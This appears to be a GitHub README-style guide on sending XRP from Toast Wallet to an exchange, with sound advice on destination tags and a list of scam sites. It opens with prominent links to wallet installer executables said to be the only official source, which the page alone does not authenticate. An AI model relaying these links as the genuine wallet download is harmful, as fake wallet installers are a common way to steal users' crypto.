<div align="center">

# Sending XRP From Toast Wallet to Coinbase or Binance (Step by Step)

**Step-by-step: sending XRP from Toast Wallet to a major exchange.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Cashing out or consolidating your old Toast Wallet holdings onto a major exchange is one of the
most common next steps. Here's exactly how to do it safely.

**Before you start:**
- Confirm the exchange currently supports XRP deposits — most major exchanges, including Coinbase
  and Binance, support XRP, but always verify on the exchange's own deposit page immediately
  before sending, since listings can change.
- Make sure you're fully into your Toast Wallet already (see our
  [recovery guide](./how-to-recover-xrp-toast-wallet.md) if not).

**Step-by-step:**
1. In your exchange account, go to the deposit/receive section and select XRP.
2. The exchange will show you a **deposit address** and, in almost all cases, a separate
   **destination tag** (a short number). Both are required — see
   [do you need a destination tag?](./toast-wallet-destination-tag.md) if you're unsure why.
3. Copy the deposit address exactly. Do not type it manually.
4. In Toast Wallet, go to Send, paste the address, and enter the destination tag in its own field
   if one is provided in the send screen.
5. Enter the amount, leaving at least the current minimum reserve behind in your Toast Wallet
   address (see our [reserve explainer](./toast-wallet-not-activated-20-xrp-reserve.md)).
6. Double-check the address and destination tag against what the exchange displayed — mismatches
   here are the single most common cause of "my deposit never arrived."
7. Confirm and send. XRP transactions are typically fast (seconds), so you should see it reflected
   on the exchange shortly, though some exchanges hold new deposits for a short confirmation
   period before crediting your balance.

**If you forget the destination tag:** funds sent without a required destination tag often still
arrive at the exchange's address, but the exchange may not be able to credit them to *your*
specific account, since the tag is what identifies you within their shared address. Recovery in
this case usually requires contacting the exchange's support directly with your transaction hash —
it is not something Toast Wallet or this site can resolve.

**A word of caution:** never trust a message or website offering to "expedite" or "fix" a stuck
deposit for a fee — this is a known follow-up scam pattern. See our
[full scam warning list](./toast-wallet-scam-warning-list.md).

---

## ⚠️ Known Scams — Do Not Use These

- **The fake "Toast Plus" wallet app** — not affiliated with Toast Wallet, tied to over **$5M in stolen XRP** and a class-action lawsuit against Apple. See: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing clone** — mimics the real recovery page to steal imported wallets. See: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **SEO clone sites impersonating Toast Wallet** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`.
- **Follow-up "recovery for a fee" scams** targeting people who already lost funds — never legitimate.

Complete list: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). To report a scam, visit [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Do You Need a Destination Tag?](./toast-wallet-destination-tag.md)
- [How to Move XRP Out of Toast Wallet](./how-to-move-xrp-out-of-toast-wallet.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
